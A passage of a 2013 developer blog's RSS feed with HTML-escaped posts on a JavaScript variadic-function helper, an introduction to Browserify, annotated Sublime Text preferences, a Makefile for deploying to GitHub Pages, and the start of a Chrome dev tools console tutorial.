&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; variadic = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;fn&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; count = &lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.max(fn.length - &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;);

  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, count);

    &lt;span class=&quot;hljs-comment&quot;&gt;// Enforce the array length, in case we don't have enough array padding.&lt;/span&gt;
    args.length = count;
    args.push(__slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, count));

    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, args);
  };
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The snippet above accepts a single function as its argument and returns a new function that will pass in every additional argument as an array to the last parameter.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; fn = variadic(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;args&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; args;
});

fn(); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; []&lt;/span&gt;
fn(&lt;span class=&quot;hljs-string&quot;&gt;'a'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; ['a']&lt;/span&gt;
fn(&lt;span class=&quot;hljs-string&quot;&gt;'a'&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;'b'&lt;/span&gt;) &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; ['a', 'b'];&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; fn = variadic(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;a, b, args&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; { a: a, b: b, args: args };
});

fn(); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; { a: undefined, b: undefined, args: [] }&lt;/span&gt;
fn(&lt;span class=&quot;hljs-string&quot;&gt;'a'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; { a: 'a', b: undefined, args: [] }&lt;/span&gt;
fn(&lt;span class=&quot;hljs-string&quot;&gt;'a'&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;'b'&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;'c'&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;'d'&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;'e'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; { a: 'a', b: 'b', args: ['c', 'd', 'e'] }&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When might you use this in practice though? One example is the Backbone.js event triggering mechanism which accepts a variable number of arguments.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;trigger: &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;name&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;._events) &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;;
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; args = slice.call(&lt;span class=&quot;hljs-built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);
  &lt;span class=&quot;hljs-comment&quot;&gt;// Trigger some events with the args.&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;;
},
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Could be rewritten to simply be:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;trigger: variadic(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;name, args&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (!&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;._events) &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;;
  &lt;span class=&quot;hljs-comment&quot;&gt;// Trigger some events with the args.&lt;/span&gt;
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;;
}),
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>Introduction to Browserify</title><link>http://blakeembrey.com/articles/2013/09/introduction-to-browserify</link><pubDate>Thu, 12 Sep 2013 22:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2013/09/introduction-to-browserify</guid><author>Blake Embrey</author><description>&lt;blockquote&gt;
&lt;p&gt;require(&amp;#39;modules&amp;#39;) in the browser.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/substack/node-browserify&quot;&gt;Browserify&lt;/a&gt; is a development tool that allows us to write node.js-style modules that compile for use in the browser. Just like node, we write our modules in separate files, exporting external methods and properties using the &lt;code&gt;module.exports&lt;/code&gt; and &lt;code&gt;exports&lt;/code&gt; variables. We can even require other modules using the &lt;code&gt;require&lt;/code&gt; function, and if we omit the relative path it&amp;#39;ll resolve to the module in the &lt;code&gt;node_modules&lt;/code&gt; directory.&lt;/p&gt;
&lt;h2 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h2&gt;
&lt;p&gt;Getting started with the browserify command-line tool requires node.js and npm installed.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;npm install browserify -g
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;our-first-module&quot;&gt;Our First Module&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;multiply.js:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;module&lt;/span&gt;.exports = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;a, b&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; a * b;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;square.js:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; multiply = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'./multiply'&lt;/span&gt;);

&lt;span class=&quot;hljs-built_in&quot;&gt;module&lt;/span&gt;.exports = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;n&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; multiply(n, n);
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;index.js:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; square = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'./square'&lt;/span&gt;);

&lt;span class=&quot;hljs-built_in&quot;&gt;console&lt;/span&gt;.log(square(&lt;span class=&quot;hljs-number&quot;&gt;125&lt;/span&gt;)); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; 15625&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now we have written a couple of modules that require each other, we can run browserify and generate the file for use in the browser:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;browserify index.js -o bundle.js
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that we have a &lt;code&gt;bundle.js&lt;/code&gt; file that bundled the three modules we wrote, we can add a single script tag reference to it into our html page and it&amp;#39;ll execute in the browser automatically resolving &lt;code&gt;require&lt;/code&gt; calls. &lt;code&gt;&amp;lt;script src=&amp;quot;bundle.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; and we should see &lt;code&gt;15625&lt;/code&gt; logged to the JavaScript console.&lt;/p&gt;
&lt;h2 id=&quot;npm-browserify&quot;&gt;NPM + Browserify&lt;/h2&gt;
&lt;p&gt;Since browserify implements the node.js module resolve algorithm, we can easily use npm to install modules from the package manager and use them inside the browser. There are lots of modules on npm that are made for tools such as browserify, but even more exciting is watching modules that were specifically written for node running in a browser environment without any effort. Let&amp;#39;s install &lt;code&gt;underscore&lt;/code&gt; and include it in our script.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;npm install underscore --save
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; _ = &lt;span class=&quot;hljs-built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;'underscore'&lt;/span&gt;);

_.each([&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;], &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;hljs-params&quot;&gt;n&lt;/span&gt;) &lt;/span&gt;{
  &lt;span class=&quot;hljs-built_in&quot;&gt;console&lt;/span&gt;.log(n); &lt;span class=&quot;hljs-comment&quot;&gt;//=&amp;gt; 1, 2, 3&lt;/span&gt;
});
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;node-core-modules&quot;&gt;Node-core Modules&lt;/h2&gt;
&lt;p&gt;The biggest attraction of browserify over similar tools would have to be the inclusion of &lt;a href=&quot;https://github.com/substack/node-browserify#compatibility&quot;&gt;node.js core modules&lt;/a&gt;. Modules such as &lt;code&gt;url&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;stream&lt;/code&gt;, &lt;code&gt;events&lt;/code&gt; and &lt;code&gt;http&lt;/code&gt; have all been ported for use in the browser. We can&amp;#39;t do everything that node can do, but we can do everything a browser can do using node.js style code.&lt;/p&gt;
&lt;p&gt;The most immediately obvious core modules that are useful on the client-side are &lt;code&gt;querystring&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt;. By requiring these core modules, we can easily parse and resolves urls, query strings and paths in a client script. On top of that, the &lt;code&gt;process&lt;/code&gt;, &lt;code&gt;Buffer&lt;/code&gt;, &lt;code&gt;__dirname&lt;/code&gt;, &lt;code&gt;__filename&lt;/code&gt; and &lt;code&gt;global&lt;/code&gt; variables are all populated with Browserify. That means we can use &lt;code&gt;process.nextTick&lt;/code&gt; to easily invoke a function on the next event loop (with full cross-browser support). A special &lt;code&gt;process.browser&lt;/code&gt; flag is also set in browserify builds, so we can do a quick check to see if the script is running in a browser environment (as opposed to node.js for all the cross-environment module developers).&lt;/p&gt;
&lt;h2 id=&quot;transforms&quot;&gt;Transforms&lt;/h2&gt;
&lt;p&gt;The most powerful feature in Browserify are &lt;a href=&quot;https://github.com/substack/node-browserify#list-of-source-transforms&quot;&gt;source transforms&lt;/a&gt;. A source transform is a stream injected between the resolved module and the content that is returned. A simple use case for using a source transform is compiling CoffeeScript to JavaScript. Using &lt;a href=&quot;https://github.com/substack/coffeeify&quot;&gt;coffeeify&lt;/a&gt; there is no longer a need for precompilation steps, it just works.&lt;/p&gt;
&lt;p&gt;There are loads more transforms and you can easily write your own. Some transforms I find myself using regularly are &lt;a href=&quot;https://github.com/substack/brfs&quot;&gt;brfs&lt;/a&gt; (inlines file contents), &lt;a href=&quot;https://github.com/epeli/node-hbsfy&quot;&gt;hbsfy&lt;/a&gt; (precompile Handlebars templates, &lt;em&gt;better performance and smaller footprint&lt;/em&gt;), &lt;a href=&quot;https://github.com/hughsk/uglifyify&quot;&gt;uglifyify&lt;/a&gt; (uglify bundled modules with UglifyJS2) and &lt;a href=&quot;https://github.com/hughsk/envify&quot;&gt;envify&lt;/a&gt; (use environment variables within modules).&lt;/p&gt;
&lt;h2 id=&quot;advanced-options&quot;&gt;Advanced Options&lt;/h2&gt;
&lt;h3 id=&quot;debug&quot;&gt;Debug&lt;/h3&gt;
&lt;p&gt;Using the &lt;code&gt;-d&lt;/code&gt; flag with Browserify will enable source map support. Source maps allow us to view the file in all its natural, multiple file glory. Just make sure you have source maps enabled in your dev tools, and debugging compiled scripts will become 100x easier.&lt;/p&gt;
&lt;h3 id=&quot;stand-alone&quot;&gt;Stand-alone&lt;/h3&gt;
&lt;p&gt;With the &lt;code&gt;-s &amp;lt;name&amp;gt;&lt;/code&gt; option, we can create a bundle for public API consumption with other browser compile and runtime tools. It uses a UMD snippet to define an AMD module, CommonJS module and even falls back to aliasing the name to the &lt;code&gt;window&lt;/code&gt; global.&lt;/p&gt;
&lt;h3 id=&quot;external&quot;&gt;External&lt;/h3&gt;
&lt;p&gt;In a production website environment, you&amp;#39;ll probably want to cut down on duplicate code being included by different modules. This can be done by using the &lt;code&gt;-x&lt;/code&gt; flag, which specifies a module that should not be bundled directly with the build and instead required from the page itself. Combine this with the &lt;code&gt;-r&lt;/code&gt; flag to explicitly require modules into a bundle, we can factor out common module dependencies and create a separate bundle.&lt;/p&gt;
&lt;h3 id=&quot;browserify-shim&quot;&gt;Browserify Shim&lt;/h3&gt;
&lt;p&gt;You&amp;#39;ll probably find some module that can&amp;#39;t simply be required because it was written for the browser environment. Conviently, we can write a simple polyfill using &lt;code&gt;module.exports = window.$&lt;/code&gt; or similar. But what if it has dependencies in the global that we have used &lt;code&gt;require&lt;/code&gt; with? We could alter the snippet a bit more and alias required modules, but even easier is the &lt;a href=&quot;https://github.com/thlorenz/browserify-shim&quot;&gt;browserify-shim&lt;/a&gt; module that was written specifically with this purpose in mind.&lt;/p&gt;
&lt;h3 id=&quot;grunt-task&quot;&gt;Grunt task&lt;/h3&gt;
&lt;p&gt;Lots of people use Grunt everyday to run their build scripts, and browserify is no exception. &lt;a href=&quot;https://github.com/jmreidy/grunt-browserify&quot;&gt;Grunt-browserify&lt;/a&gt; provides an awesome grunt configuration for setting up your browserify builds and even comes with some extra sugar on top, such as a bundled &lt;code&gt;browserify-shim&lt;/code&gt; config option.&lt;/p&gt;
&lt;h3 id=&quot;browser-field-package-json-&quot;&gt;Browser Field (package.json)&lt;/h3&gt;
&lt;p&gt;Browserify also supports the &lt;a href=&quot;https://gist.github.com/shtylman/4339901&quot;&gt;browser&lt;/a&gt; field in &lt;code&gt;package.json&lt;/code&gt; files. This allows module developers to specify specific files that should be used in browser builds, in the case that the module has node-specific code that can&amp;#39;t or shouldn&amp;#39;t be browserified.&lt;/p&gt;
&lt;h2 id=&quot;next-steps&quot;&gt;Next Steps&lt;/h2&gt;
&lt;p&gt;This has been a very brief introduction to Browserify and I haven&amp;#39;t even covered everything that is possible. The &lt;a href=&quot;https://github.com/substack/node-browserify&quot;&gt;browserify docs&lt;/a&gt; cover plenty of information and additional flags, so definitely take a quick look. Feel free to leave a comment with any issues you have, I&amp;#39;d love to help out and write a follow up post that covers more uses.&lt;/p&gt;
</description></item><item><title>My Sublime Text Preferences Explained</title><link>http://blakeembrey.com/articles/2013/08/sublime-text-preferences</link><pubDate>Sun, 11 Aug 2013 22:20:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2013/08/sublime-text-preferences</guid><author>Blake Embrey</author><description>&lt;p&gt;Prompted by the many preference file posts recently, I have finally gotten around to posting my config with a few inline comments.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;{
  &lt;span class=&quot;hljs-comment&quot;&gt;// Makes folders stand out from files&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;bold_folder_labels&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Clean colour scheme, comes with Flatland theme&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;color_scheme&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;Packages/Theme - Flatland/Flatland Monokai.tmTheme&quot;&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Switch to `all` to always show invisibles&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;draw_white_space&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;selection&quot;&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Always adds a trailing newline character&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;ensure_newline_at_eof_on_save&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Exludes directories from showing up in the sidebar and search&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;folder_exclude_patterns&quot;&lt;/span&gt;: [
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;.svn&quot;&lt;/span&gt;,
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;.git&quot;&lt;/span&gt;,
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;.hg&quot;&lt;/span&gt;,
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;CVS&quot;&lt;/span&gt;,
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;node_modules&quot;&lt;/span&gt;,
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;bower_components&quot;&lt;/span&gt;
  ],
  &lt;span class=&quot;hljs-comment&quot;&gt;// Source Code Pro is my favourite monospace font - download at https://github.com/adobe/source-code-pro&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;font_face&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;Source Code Pro&quot;&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Current working font size&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;font_size&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;15.0&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Highlight the current line - makes it easier to focus and find where you are typing&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;highlight_line&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Make it obvious when I haven't saved something&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;highlight_modified_tabs&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Ignore VIM mode, it plays havoc with some of my other preferred shortcuts&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;ignored_packages&quot;&lt;/span&gt;: [
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;Vintage&quot;&lt;/span&gt;
  ],
  &lt;span class=&quot;hljs-comment&quot;&gt;// Draw all indent guides, but also draw the carets indent guide in a different color&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;indent_guide_options&quot;&lt;/span&gt;: [
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;draw_active&quot;&lt;/span&gt;,
    &lt;span class=&quot;hljs-string&quot;&gt;&quot;draw_normal&quot;&lt;/span&gt;
  ],
  &lt;span class=&quot;hljs-comment&quot;&gt;// Removes the extra whitespace using `Source Sans Pro` comes with&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;line_padding_bottom&quot;&lt;/span&gt;: -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;line_padding_top&quot;&lt;/span&gt;: -&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Render a vertical ruler at the 80 character mark, tries to keep me considerate&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;rulers&quot;&lt;/span&gt;: [
    &lt;span class=&quot;hljs-number&quot;&gt;80&lt;/span&gt;
  ],
  &lt;span class=&quot;hljs-comment&quot;&gt;// Saving everytime I lose focus causes all sorts of conflicts&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;save_on_focus_lost&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Always allow me to scroll beyond the last line&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;scroll_past_end&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Enable `shift + tab` to cause unindent&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;shift_tab_unindent&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Override tab size to equal 2 spaces&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;tab_size&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Beautiful and minimal theme - download at https://github.com/thinkpixellab/flatland&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;theme&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-string&quot;&gt;&quot;Flatland Dark.sublime-theme&quot;&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Use spaces for indentation&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;translate_tabs_to_spaces&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Removes all the trailing white space on save&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;trim_trailing_white_space_on_save&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;,
  &lt;span class=&quot;hljs-comment&quot;&gt;// Wraps lines instead of enabling horizontal scroll&lt;/span&gt;
  &lt;span class=&quot;hljs-string&quot;&gt;&quot;word_wrap&quot;&lt;/span&gt;: &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
</description></item><item><title>Writing a Github Pages Deploy Script</title><link>http://blakeembrey.com/articles/2013/08/writing-github-pages-deploy-script</link><pubDate>Sun, 04 Aug 2013 20:40:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2013/08/writing-github-pages-deploy-script</guid><author>Blake Embrey</author><description>&lt;p&gt;Lately I have found myself creating more and more sites of the static kind and deploying them Github Pages. Regularly, this would involve having a &lt;code&gt;public&lt;/code&gt; directory which contains all the assets before I build them (think preprocessor - SASS, Less, Stylus, Jade, Browserify, Requirejs) and another &lt;code&gt;build&lt;/code&gt; directory where these assets are compiled to during development, testing and deployment. I found myself doing this so often, I figured I&amp;#39;d better make a little Makefile script for me to easily deploy any directory to Github Pages.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;deploy:
  @grunt build
  @&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; ./build &amp;amp;&amp;amp; git init . &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git commit -m \&lt;span class=&quot;hljs-string&quot;&gt;&quot;Deploy\&quot; &amp;amp;&amp;amp; \
  git push &quot;&lt;/span&gt;git@github.com:blakeembrey/&amp;lt;repo&amp;gt;.git&lt;span class=&quot;hljs-string&quot;&gt;&quot; master:gh-pages --force &amp;amp;&amp;amp; rm -rf .git&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;All the script does is run the build, in this case &lt;code&gt;grunt build&lt;/code&gt; and initialises the &lt;code&gt;build&lt;/code&gt; directory as a git repository. It then commits all the directory contents and pushes it up to the Github Pages branch of a repo you define.&lt;/p&gt;
</description></item><item><title>Improving Your JavaScript Console Skills</title><link>http://blakeembrey.com/articles/2013/07/improve-dev-tools-console-workflow</link><pubDate>Fri, 05 Jul 2013 10:00:00 +1000</pubDate><guid isPermaLink="true">http://blakeembrey.com/articles/2013/07/improve-dev-tools-console-workflow</guid><author>Blake Embrey</author><description>&lt;p&gt;&lt;em&gt;This article is meant as an introduction to some of the features of the JavaScript console. It is not all encompassing, but I will try to cover all the features I find myself using and others that I could not live without. All the features mentioned will be tailored to the Chrome Dev Tools, but I will try to mention any differences with other modern browsers.&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;accessing-the-dev-tools&quot;&gt;Accessing the dev tools&lt;/h2&gt;
&lt;p&gt;If you have never used the developer tools before, you may have problems finding them. The easiest and simplest way to access the developer tools is by using the keyboard shortcuts. On Mac, this is &lt;code&gt;Command + Option + I&lt;/code&gt;. On Windows, it&amp;#39;ll be &lt;code&gt;F12&lt;/code&gt;. In Safari, you&amp;#39;ll have to enable the developer tools under preferences first.&lt;/p&gt;
&lt;p&gt;You can also inspect an element directly by right clicking and choosing &lt;code&gt;Inspect Element&lt;/code&gt;, and you can always access the dev tools from the menu shortcuts.&lt;/p&gt;
&lt;h2 id=&quot;console-functions&quot;&gt;Console Functions&lt;/h2&gt;
&lt;p&gt;The console global is an object that provides some useful shortcuts for debugging JavaScript. Arguably the most used function is &lt;code&gt;console.log&lt;/code&gt;, but did you know the console also provides &lt;code&gt;info&lt;/code&gt;, &lt;code&gt;warn&lt;/code&gt;, &lt;code&gt;debug&lt;/code&gt; and &lt;code&gt;error&lt;/code&gt; functions. They operate in the same way as the &lt;code&gt;log&lt;/code&gt; function, but the visual output will be altered and &lt;code&gt;error&lt;/code&gt; output an accompanying stack trace.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;console-functions.png&quot; alt=&quot;Console Functions Demonstrated&quot;&gt;&lt;/p&gt;
&lt;p&gt;All these functions accepts an unlimited number of parameters, and will be formatted for output in the console in different ways - depending on the object types there are. For example, DOM nodes will output as a representation of the node from the elements tab while array-like objects will appear as an array.&lt;/p&gt;
&lt;p&gt;However, this added formatting convenience can sometimes be a pain. This is especially relevant when you want to see the underlying structure of a DOM node or an object. You may not even know it, but you have probably needed &lt;code&gt;console.dir&lt;/code&gt; at some point because it does exactly this.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;console-dir-vs-log.png&quot; alt=&quot;Difference between console.log and console.dir&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;manipulating-nodes-from-the-elements-tab&quot;&gt;Manipulating Nodes from the Elements Tab&lt;/h2&gt;
